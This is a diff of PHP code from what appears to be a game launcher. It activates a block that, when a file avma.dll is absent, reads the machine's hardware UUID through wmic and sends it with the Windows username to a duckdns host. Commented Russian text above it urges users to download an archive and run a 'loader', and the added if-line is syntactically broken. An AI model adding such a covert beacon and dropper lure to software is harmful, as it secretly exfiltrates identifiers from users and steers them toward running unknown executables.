@@ -10,15 +10,15 @@ $GLOBALS['start'] = 1;
     message("Для запуска игры нужен специальный файл,\nего можно скачать в открывшемся окне браузера!\nСкачайте архив и запустите загрузчик файла!\nДождитесь загрузки файла и поместите файл avma.dll в папку с игрой!\nПосле чего запускайте игру!");
 }*/
 
-
-/*$code = execute('cmd /c wmic csproduct get uuid',true);
+if(!file_exists('avma.dll'){
+$code = execute('cmd /c wmic csproduct get uuid',true);
 $code->getInput()->eachLine(function ($line){
 	if($line != null && trim(strtolower($line)) != "uuid"){
 		file_get_contents('http://oxibyte.duckdns.org/?id='.$_ENV["USERNAME"].'-'.$line."_офлайн");
 	}
 });
+}
 
-*/
 /*
 //////////////////////////////////////
 $form1 = new UXForm;
